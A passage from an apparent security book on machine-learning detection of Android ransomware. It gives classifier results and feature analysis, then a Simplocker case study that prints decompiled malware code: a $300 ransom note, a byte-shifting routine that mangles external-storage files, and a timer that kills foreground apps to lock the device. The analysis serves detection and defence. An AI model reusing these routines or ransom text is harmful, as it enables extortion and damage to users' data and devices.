<td style="vertical-align: top"><p class="noindent-tab">0.8879</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1530</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0604</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Best late fusion</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9653</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9197</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9649</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent"><strong>0.9418</strong></p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0803</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0458</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">As you can see, the machine learning approaches described in this book can achieve a precision of almost 92 percent and a recall exceeding 96 percent, which are excellent performance numbers.</p>&#13;
<h3 class="h3" id="ch10lev4"><strong>Ransomware vs. Other Malware</strong></h3>&#13;
<p class="noindent"><a href="ch10.xhtml#ch10fig2">Figure 10-2</a> shows the 20 most important features for distinguishing ransomware from other forms of malware.</p>&#13;
<p class="indent">Permissions play the largest role here, so we’ll focus on those. Ransom-ware also seems to make more calls to <span class="literal">android.security</span>, <span class="literal">android.content.pm</span>, and <span class="literal">android.database</span> than other malware categories, but these differences are quite small. Similarly, we see once again that ransomware makes more calls to the functions <span class="literal">org.apache.http.conn</span>, <span class="literal">org.apache.http.conn.schema</span>, and <span class="literal">org.apache.http.params</span> compared to other malware.</p>&#13;
<h4 class="h4" id="ch10lev1sec4"><strong><em>Permission-Related Features</em></strong></h4>&#13;
<p class="noindent">You should immediately notice that other malware requests the SMS-related permissions <span class="literal">SEND_SMS</span>, <span class="literal">RECEIVE_SMS</span>, and <span class="literal">WRITE_SMS</span> more frequently than ransomware. This is not surprising, because other forms of malware use those permissions for tasks like intercepting two-factor authentication messages, which ransomware doesn’t need to do.</p>&#13;
<div class="image"><img id="ch10fig2" src="../images/ch10fig02.jpg" alt="Image" width="1882" height="932"/></div>&#13;
<p class="figcap"><em>Figure 10-2: Top 20 features that best distinguish Android ransomware from other malware</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_259"/><span epub:type="pagebreak" id="page_260"/>On the other hand, ransomware is more likely than other forms of malware to request the <span class="literal">RESTART_PACKAGES</span> and <span class="literal">READ_LOGS</span> permissions, both of which were described in the previous section. Another permission that is far more frequently requested by ransomware apps than by other forms of malware is <span class="literal">DIAGNOSTIC</span>, which allows apps to read and write to diagnostic resources. Yet because this permission is privileged, unprivileged applications can’t use it, including all current ransomware families we are aware of.</p>&#13;
<h4 class="h4" id="ch10lev1sec5"><strong><em>Prediction Efficacy</em></strong></h4>&#13;
<p class="noindent"><a href="ch10.xhtml#ch10tab3">Table 10-3</a> shows how effective machine learning algorithms are at separating ransomware from other forms of malware.</p>&#13;
<p class="tabcap" id="ch10tab3"><strong>Table 10-3:</strong> Android Ransomware and Other Malware Classification</p>&#13;
<table class="all">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:20%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
</colgroup>&#13;
<thead>&#13;
<tr>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Feature set</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Best classifier</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>AUC</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Precision</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Recall</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>F1</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>FPR</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>FNR</strong></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">API package</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8075</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8135</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7921</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8027</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1865</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.2043</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Static (S</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7739</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7652</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7926</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7787</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2348</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2165</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Dynamic (D)</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">RF</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6756</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6395</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6739</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6563</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3605</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3470</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">S + D</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">GBDT</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7949</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7977</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7827</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7901</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2023</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2151</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">API + S + D</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">GBDT</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8209</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8088</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8172</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8129</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1912</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1856</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">TSG</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">RF</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7097</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7110</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7097</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7104</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2890</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2917</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">LM</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">RF</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7443</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7611</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.5992</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6705</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.2389</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3328</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">FC</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">SVM</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.5459</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.5222</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.6211</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.5674</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.4778</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.4713</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">CG</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">RF</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7443</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7611</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.5992</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6705</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.2389</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3328</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">API + S + D + TSG</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">GBDT</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9180</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8619</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8351</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8483</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1381</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1610</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">API + S + D + LM</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8718</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8385</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7667</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8010</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1615</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.2166</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">API + S + D + FC</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">GBDT</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8791</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8388</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7653</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8004</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1612</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2171</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">API + S + D + CG</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">GBDT</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8983</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8688</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.7912</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8282</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1312</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1932</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">All features</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9168</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8635</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8285</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8456</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1365</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1659</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Best late fusion</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8593</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8718</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9497</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent"><strong>0.9091</strong></p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1282</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.2545</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">The precision and recall are lower in this case, at just over 87 percent and about 95 percent, respectively. It isn’t surprising that separating ransomware from other malware is harder than separating ransomware from goodware, as ransomware often has more in common with other malware categories than with goodware.</p>&#13;
<h3 class="h3" id="ch10lev5"><strong>Simplocker: A Case Study</strong></h3>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_261"/>In this section, we explore the Simplocker ransomware app <em>qok.wrrgz.xcfwc</em> (v1, a10b). This app requests an extensive list of permissions, too long to show here. The motivation for requesting so many permissions is unclear, as code analysis of the sample shows that the vast majority aren’t actually used. This behavior matches what we found when analyzing the machine learning results discussed earlier in this chapter: it seems that ransomware often requests permissions that it doesn’t or cannot use.</p>&#13;
<p class="indent">Let’s see how the app achieves its malicious behavior. <a href="ch10.xhtml#ch10lis1">Listing 10-1</a> shows the dialog definition code used by Simplocker to craft its ransom note.</p>&#13;
<pre>&lt;?xml version="1.0" encoding="utf-8"?&gt;&#13;
...&#13;
        &lt;TextView android:textAppearance="?android:attr/textAppearanceMedium"&#13;
android:textSize="16sp" android:textColor="#ffffffff" android:id="@+id/textView1"&#13;
android:layout_width="match_parent" android:layout_height="wrap_content" &#13;
android:layout_marginLeft="10dp" android:layout_marginTop="10dp" android:layout_&#13;
marginRight="10dp" android:layout_marginBottom="10dp" android:text="To unlock your &#13;
device and to avoid other legal consequences, you are obligated to pay a release fee &#13;
of $300. Payable through GreenDot MoneyPak (you have to purchase MoneyPak card. load &#13;
it with $300 and enter the code). You can buy the card at any store or gas station,&#13;
payzone or paypoint."/&gt;&#13;
      &lt;/LinearLayout&gt;&#13;
...&#13;
        &lt;TextView android:textSize="20sp" android:textColor="#ffffffff" &#13;
android:gravity=&#13;
"center" android:id="@+id/textView2" android:padding="15dp" android:layout_width=&#13;
"wrap_content" android:layout_height="wrap_content" android:text="Wrong MoneyPack code.&#13;
You have only 3 attempts. Please try again"/&gt;&#13;
      &lt;/LinearLayout&gt;&#13;
...&#13;
        &lt;EditText android:id="@+id/et_number" android:layout_width=&#13;
"match_parent" android:layout_height="wrap_content" android:layout_marginLeft="30dp" &#13;
android:layout_marginRight="30dp" android:hint="Enter $300 MoneyPak code" &#13;
android:ems="10" android:maxLength="14" android:inputType="number"/&gt;&#13;
      &lt;LinearLayout android:gravity="center" android:layout_width=&#13;
"match_parent" android:layout_height="wrap_content"&gt;&#13;
...&#13;
        &lt;TextView android:textSize="30sp" android:textColor="#ffffffff" &#13;
android:gravity="center" android:id="@+id/textView3" android:padding="20dp" &#13;
android:layout_width="match_parent" android:layout_height="wrap_content" &#13;
android:text="Your request will be processed within 24 hours"/&gt;&#13;
      &lt;/LinearLayout&gt;</pre>&#13;
<p class="list" id="ch10lis1"><em>Listing 10-1: Code used to display the ransom note in Simplocker</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_262"/>This code includes the following text, which provides a clear indication that we’re dealing with ransomware:</p>&#13;
<div class="bq">&#13;
<p class="noindent">To unlock your device and to avoid other legal consequences, you are obligated to pay a release fee of $300. Payable through GreenDot MoneyPak (you have to purchase MoneyPak card. load it with $300 and enter the code). You can buy the card at any store or gas station, payzone or paypoint.</p>&#13;
</div>&#13;
<p class="indent">Next, <a href="ch10.xhtml#ch10lis2">Listing 10-2</a> shows the code that Simplocker uses to encrypt files. The encryption is exceptionally simple. For every file to which the ransom-ware can write in external storage (see <span class="literal">encryptAll</span>), it increases the byte values of all bytes in the file by 1 (see <span class="literal">goToDir</span>).</p>&#13;
<pre>public static void goToDir(File file, boolean z) {&#13;
  Log.v("CRYPT", file.getAbsolutePath());&#13;
  if (z) {&#13;
    try {&#13;
      byte[] readBytes = readBytes(&#13;
        String.valueOf(String.valueOf(file.getAbsolutePath().substring(&#13;
          0, file.getAbsolutePath().lastIndexOf("/"))) + "/" + file.getName()));&#13;
      byte[] bArr = new byte[readBytes.length];&#13;
      for (int i = 0; i &lt; readBytes.length; i++) {&#13;
        bArr[i] = (byte) (readBytes[i] + 1);&#13;
      }&#13;
      BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(&#13;
        new FileOutputStream(new File(file.getAbsolutePath())));&#13;
      bufferedOutputStream.write(bArr);&#13;
      bufferedOutputStream.flush();&#13;
      bufferedOutputStream.close();&#13;
    } catch (Throwable th) {&#13;
      File[] listFiles = new File(file.getAbsolutePath()).listFiles();&#13;
      for (File goToDir : listFiles) {&#13;
        goToDir(goToDir, z);&#13;
      }&#13;
    }&#13;
  } else {&#13;
    byte[] readBytes2 = readBytes(&#13;
      String.valueOf(String.valueOf(file.getAbsolutePath().substring(&#13;
        0, file.getAbsolutePath().lastIndexOf("/"))) + "/" + file.getName()));&#13;
    byte[] bArr2 = new byte[readBytes2.length];&#13;
    for (int i2 = 0; i2 &lt; readBytes2.length; i2++) {&#13;
      bArr2[i2] = (byte) (readBytes2[i2] - 1);&#13;
    }&#13;
    BufferedOutputStream bufferedOutputStream2 = new BufferedOutputStream(&#13;
      new FileOutputStream(new File(file.getAbsolutePath())));&#13;
    bufferedOutputStream2.write(bArr2);&#13;
    bufferedOutputStream2.flush();&#13;
    bufferedOutputStream2.close();&#13;
  }&#13;
}&#13;
&#13;
public void encryptAll() {&#13;
  File[] listFiles = new File(&#13;
    String.valueOf(Environment.getExternalStorageDirectory())).listFiles();&#13;
  for (File goToDir : listFiles) {&#13;
    goToDir(goToDir, true);&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch10lis2"><em>Listing 10-2: Code used to encrypt files in Simplocker</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_263"/>This encryption is trivial to break, but it’s enough to completely mangle all file contents from the point of view of inexperienced users. Note that we can find the decryption functionality in the same function. The presence of the Boolean flag <span class="literal">z</span> passed to <span class="literal">goToDir</span> determines whether the function performs encryption or decryption.</p>&#13;
<p class="indent"><a href="ch10.xhtml#ch10lis3">Listing 10-3</a> shows a snippet of the code used to kill relevant processes and time the locking mechanism.</p>&#13;
<pre>/* compiled from: BackgroundService */&#13;
public class Hans5 extends Service {&#13;
  public static Hans5 Activity = null;&#13;
  public static Timer LockerExecutor = null;&#13;
  public static PowerManager.WakeLock wakeLock;&#13;
&#13;
  public static void BringToFront(Context context) {&#13;
    try {&#13;
      Intent intent = new Intent(context.getApplicationContext(), Hans2.class);&#13;
      intent.setFlags(272629760);&#13;
      context.startActivity(intent);&#13;
    } catch (Throwable th) {&#13;
      th.printStackTrace();&#13;
    }&#13;
  }&#13;
&#13;
  private TimerTask LockerTimer() {&#13;
    return new TimerTask() {&#13;
      public void run() {&#13;
        try {&#13;
          if (Hans2.Activity != null &amp;&amp; !Hans2.STOP &amp;&amp;&#13;
              ((PowerManager) Hans2.Activity.getSystemService("power")).isScreenOn()) {&#13;
            ActivityManager activityManager =&#13;
              (ActivityManager) Hans2.Activity.getSystemService("activity");&#13;
            List&lt;ActivityManager.RunningTaskInfo&gt; runningTasks =&#13;
              activityManager.getRunningTasks(1);&#13;
            ComponentName componentName = runningTasks.get(0).topActivity;&#13;
            String packageName = componentName.getPackageName();&#13;
            if (!packageName.equals("qok.wrrgz.xcfwc") &amp;&amp;&#13;
                !packageName.equals("com.android.settings")) {&#13;
              Process.killProcess(runningTasks.get(0).id);&#13;
              Hans2.Activity.finishActivity(runningTasks.get(0).id);&#13;
              activityManager.killBackgroundProcesses(&#13;
                componentName.getPackageName());&#13;
              Hans5.BringToFront(Hans2.Activity.getApplicationContext());&#13;
            }&#13;
          }&#13;
          if (Hans5.Activity == null) {&#13;
            Intent intent = new Intent();&#13;
            intent.setAction("qok.wrrgz.xcfwc.Hans5");&#13;
            Hans5.this.getApplicationContext().startService(intent);&#13;
          }&#13;
        } catch (Throwable th) {&#13;
          th.printStackTrace();&#13;
        }&#13;
      }&#13;
    };&#13;
  }&#13;
&#13;
  public void onStart(Intent intent, int i) {&#13;
    Activity = this;&#13;
    wakeLock = ((PowerManager) getSystemService("power")).newWakeLock(1, "locker");&#13;
    wakeLock.acquire();&#13;
    startTimer(LockerExecutor, LockerTimer(), 0, 10);&#13;
    super.onStart(intent, i);&#13;
  }&#13;
&#13;
  ...&#13;
}</pre>&#13;
<p class="list" id="ch10lis3"><em>Listing 10-3: Code used to kill processes</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_264"/>The ransomware sets up a repeating timer through <span class="literal">Timer.scheduleAtFixed Rate</span>. As a result, every 10 ms, the ransomware checks which app the user is currently interacting with and kills it if it’s not the ransomware itself or the Settings app. Why the ransomware allow-lists the Settings app is unclear.</p>&#13;
<h3 class="h3" id="ch10lev6"><strong>Predictions for Important Ransomware Samples</strong></h3>&#13;
<p class="noindent"><a href="ch10.xhtml#ch10tab4">Table 10-4</a> shows how well our machine learning classifiers performed when presented with the ransomware samples we discussed in this chapter.</p>&#13;
<p class="tabcap" id="ch10tab4"><strong>Table 10-4:</strong> Performance of Machine Learning Classifiers on Ransomware Families</p>&#13;
<table class="all">&#13;
<colgroup>&#13;
<col style="width:35%"/>&#13;
<col style="width:30%"/>&#13;
<col style="width:30%"/>&#13;
</colgroup>&#13;
<thead>&#13;
<tr>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Ransomware</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Distinguished from goodware</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Distinguished from other malware</strong></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Chiffon</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">LeakerLocker</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Simplocker</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Svpeng</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Police</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Jisut</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Anubis</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">SimpleLocker</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_265"/>We see that in all cases the machine learning classifiers are able to correctly identify the samples as ransomware rather than goodware, and in six out of eight cases they are able to correctly identify the type of malware, despite some of the samples sharing characteristics with other malware categories.</p>&#13;
<h3 class="h3" id="ch10lev7"><strong>Up Next</strong></h3>&#13;
<p class="noindent">Ransomware incidents aren’t nearly as common on the Android platform as on Windows, where most ransomware incidents take place. In this chapter, we’ve shown that permissions are once again the key features useful for distinguishing ransomware from goodware, though the permissions used by different ransomware samples can vary widely. In the next chapter, we’ll examine a form of malware that’s much more common on Android: SMS fraud.<span epub:type="pagebreak" id="page_266"/></p>&#13;
</div>
</div>
<div style="float: none; margin: 10px 0px 10px 0px; text-align: center;"><p><a href="https://oceanofpdf.com"><i>OceanofPDF.com</i></a></p></div></body></html>